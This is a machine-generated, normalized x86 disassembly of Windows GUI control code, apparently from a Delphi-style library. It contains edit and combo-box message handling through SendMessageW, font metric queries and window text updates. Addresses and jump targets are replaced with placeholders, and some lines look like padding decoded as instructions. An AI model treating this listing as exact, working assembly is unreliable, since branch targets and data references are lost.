mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_4929c0
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x33
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_4929c0
mov eax [ ebx + 0x24c ]
test eax eax
je r-xdata
add esp 0xcc
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageW
jmp r-xdata
sub_45aac4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x272 ] 0x1
xor eax eax
push ebp
push sub_45ab03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4927d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ab0a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x272 ] 0x0
retn
sub_45ab0a
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x264 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x273 ]
mov eax [ ebp - 0x4 ]
call sub_45a604
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
cmp eax 0xffffffff
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf4 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0xffffffff
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x26a ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x26a ] 0x2a
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ac18
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe0 ]
pop ecx
pop ebp
retn
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xf0 ]
sub_45abdc
push ebx
mov ebx eax
mov eax ebx
call sub_45a5cc
mov [ ebx + 0x273 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
mov [ ebx + 0x280 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
mov [ ebx + 0x284 ] eax
mov eax ebx
call sub_492bec
pop ebx
retn
sub_45ac18
push ebx
mov ebx eax
cmp [ ebx + 0x26d ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x268 ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_45ac54
pop ebx
retn
sub_45ac54
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45acca
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsW
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_46d5ec
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsW
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45acd1
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_45acd1
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ ebp - 0x44 ]
mov eax [ ebp - 0x80 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e1 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
add eax eax
add eax eax
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ ebp - 0x80 ]
add edx ebx
mov eax [ ebp - 0x4 ]
call sub_48d62c
pop ebx
mov esp ebp
pop ebp
retn
push 0x6
call GetSystemMetrics
imul ebx eax
jmp r-xdata
sub_45ad5c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
sub eax 0x7
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
sub eax 0xb046
je r-xdata
mov edx esi
mov eax ebx
call sub_493bd8
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
cmp [ ebx + 0x274 ] 0x0
je r-xdata
sub eax 0xce6
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
jmp r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov eax ebx
call sub_496868
pop edx
call sub_48ab7c
mov [ ebx + 0x274 ] 0x0
test [ ebx + 0x55 ] 0x80
je r-xdata
jmp r-xdata
cmp [ ebx + 0x274 ] 0x0
jne r-xdata
mov [ ebx + 0x274 ] 0x1
push 0x0
push 0x0
push 0xb04d
mov eax ebx
call sub_496868
push eax
call PostMessageW
jmp r-xdata
sub_45ae00
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_496868
push eax
call GetWindowLongW
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_496868
push eax
call SendMessageW
sub_45ae40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_495d94
pop esi
pop ebx
retn
cmp [ ebx + 0x268 ] 0x1
jne r-xdata
mov eax ebx
call sub_45ac18
mov eax ebx
call sub_492ec4
sub_45ae74
push ebx
mov ebx eax
mov eax ebx
call sub_495cd8
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_45ac54
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_45aec0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x26e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_495b20
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
test al 0x4
jne r-xdata
mov eax ebx
call sub_45a804
sub_45aefc
push esi
mov esi eax
mov eax esi
call sub_497d48
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax esi
mov si 0xffb0
call sub_4483f8
push 0xfffffff0
mov eax esi
call sub_496868
push eax
call GetWindowLongW
test al 0x4
je r-xdata
pop esi
retn
sub_45af34
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
cmp [ ebx + 0x7c ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_497b84
mov [ esp ] 0x0
mov eax [ edi + 0x8 ]
mov [ esp + 0x2 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
mov ecx esp
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffe7
call sub_4483f8
movzx eax [ esp ]
mov [ edi + 0xc ] eax
cmp [ esp ] 0x0
jne r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi edi
lea edi [ esp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x18 ]
push eax
mov eax [ ebx + 0x24c ]
push eax
mov eax [ ebx + 0x248 ]
push eax
call CallWindowProcW
mov [ esp + 0x1c ] eax
jmp r-xdata
sub_45afd4
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x1c ]
call sub_496c14
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
push eax
push 0xc1
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_45b044
push ebx
push esi
push edi
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ esp + 0x2000 ]
add esp 0x4
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov ecx eax
mov edx esp
mov eax edi
call sub_449e68
add esp 0x2000
pop edi
pop esi
pop ebx
retn
sub_45b09c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
push edi
mov eax [ ebx + 0x1c ]
call sub_496868
xor ecx ecx
mov edx 0xc2
call sub_41f080
sub_45b108
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_45b1ed
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b1f4
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_44a0e8
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x1c ]
call sub_496868
xor ecx ecx
mov edx 0xc2
call sub_41f080
add ebx eax
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_44a0e8
sub_45b203
inc [ edx ]
add [ eax ] al
add [ 0xa00 ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
push 0x0
mov eax [ ebx + 0x1c ]
call sub_496868
xor ecx ecx
mov edx 0xc2
call sub_41f080
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov edi eax
add edi esi
sub_45b2a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x1c ]
call sub_496c14
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x1c ]
call sub_48f2b0
mov eax [ esi + 0x1c ]
call sub_48e5a8
sub_45b30c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45b3fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43525c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ esi + 0x1c ]
call sub_48df00
cmp ebx eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea edx [ ebp - 0x8 ]
mov eax [ esi + 0x1c ]
call sub_48df68
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call j_sub_44a294
setne al
mov al 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b405
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x1c ]
call sub_496868
xor ecx ecx
mov edx 0xc
call sub_41f080
test eax eax
jne r-xdata
test al al
je r-xdata
push 0x0
mov eax [ esi + 0x1c ]
xor ecx ecx
mov edx 0xb012
call sub_48f2b0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_45b40c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45a390
mov edx 0xb9
mov eax ebx
call sub_48d5f8
mov edx 0x59
mov eax ebx
call sub_48d62c
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebx + 0x295 ] 0x1
mov [ ebx + 0x296 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x290 ] esi
mov [ esi + 0x1c ] ebx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_45b49c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x290 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_45b4cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45a960
mov eax [ esi + 0x4 ]
movzx edx [ ebx + 0x295 ]
mov edx [ edx * 4 + rw-data ]
not edx
and eax edx
or eax 0x4
movzx edx [ ebx + 0x294 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_45b508
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45b603
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx sub_45b610
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_41d3e0
mov [ esi + 0x24c ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx sub_45b610
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_41d3e0
mov edi eax
mov [ esi + 0x24c ] edi
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_449ed8
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xc
mov eax [ esi + 0x24c ]
call sub_41f080
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b60a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageW
jmp r-xdata
sub_45b610
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_496868
push eax
call SendMessageW
shr eax 0x10
and eax 0xffff
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_496868
push eax
call SendMessageW
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub [ esi ] eax
pop esi
pop ebx
retn
sub_45b670
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_496868
push eax
call SendMessageW
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop esi
pop ebx
retn
sub_45b6fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x297 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
sub_45b738
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4956ec
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_45b760
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_45b798
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42588c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_45b7dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45b85e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push esi
push 0x150
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov ebx edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b865
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_425c00
test esi esi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jle r-xdata
sub_45b870
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
pop edi
pop esi
pop ebx
retn
sub_45b894
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_449fd0
test eax eax
jle r-xdata
mov edx esi
xchg edx eax
call sub_449fd0
mov eax [ esi ]
call sub_449db8
push eax
push edi
push 0x148
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b8f0
push ebp
mov ebp esp
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_45b954
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x1c ]
call sub_48df68
push 0x0
push 0x0
push 0x14b
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x1c ]
call sub_48dfa0
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b95b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_45b960
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
pop esi
pop ebx
retn
sub_45b980
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax [ ebx + 0x1c ]
call sub_496868
or ecx 0xffffffff
mov edx 0x158
call sub_41f080
pop esi
pop ebx
retn
sub_45b9a0
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x1c ]
call sub_496868
push eax
call SendMessageW
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x1c ]
call sub_48e5a8
sub_45b9d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ba3f
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov eax [ ebx + 0x1c ]
call sub_496868
xor ecx ecx
mov edx 0x143
call sub_41f080
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ba46
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_45ba50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45babc
push [ fs : eax ]
mov [ fs : eax ] esp
push edi
mov eax [ ebx + 0x1c ]
call sub_496868
mov ecx esi
mov edx 0x14a
call sub_41f080
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bac3
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_45bacc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_490f20
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_48d5f8
mov edx 0x19
mov eax ebx
call sub_48d62c
mov dl 0x1
mov eax ebx
call sub_496b44
xor edx edx
mov eax ebx
call sub_48e174
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov esi eax
mov [ ebx + 0x260 ] esi
mov eax esi
mov edx ebx
call sub_48c730
mov [ ebx + 0x298 ] 0x10
push ebx
mov eax [ ebx ]
mov eax [ eax + 0x10c ]
push eax
call sub_42f338
mov [ ebx + 0x2bc ] eax
push ebx
push sub_45c010
call sub_42f338
mov [ ebx + 0x2c0 ] eax
mov [ ebx + 0x268 ] 0x8
mov [ ebx + 0x270 ] 0xffffffff
mov [ ebx + 0x2b8 ] 0xffffffff
mov [ ebx + 0x26c ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_45bbcc
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax [ esi + 0x2c0 ]
call sub_42f3d0
mov eax [ esi + 0x2bc ]
call sub_42f3d0
mov eax [ esi + 0x260 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_49107c
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_45bc4e
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_492c54
xor eax eax
mov [ ebx + 0x2a0 ] eax
xor eax eax
mov [ ebx + 0x2a4 ] eax
xor eax eax
mov [ ebx + 0x2a8 ] eax
pop ebx
retn
sub_45bc98
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_496868
push eax
call SendMessageW
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_45bcbc
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
movzx eax bl
push eax
push 0x14f
mov eax esi
call sub_496868
push eax
call SendMessageW
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_496868
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_45bd00
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
mov eax [ ebx + 0x270 ]
pop ebx
retn
sub_45bd2c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x270 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_45bd68
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x264 ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x264 ] esi
mov eax ebx
call sub_496c14
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_496868
push eax
call SendMessageW
sub_45bdb8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x16c ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x16c ]
push eax
mov eax esi
call sub_496868
push eax
call SetWindowTextW
sub_45be08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_45bc98
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_45be40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
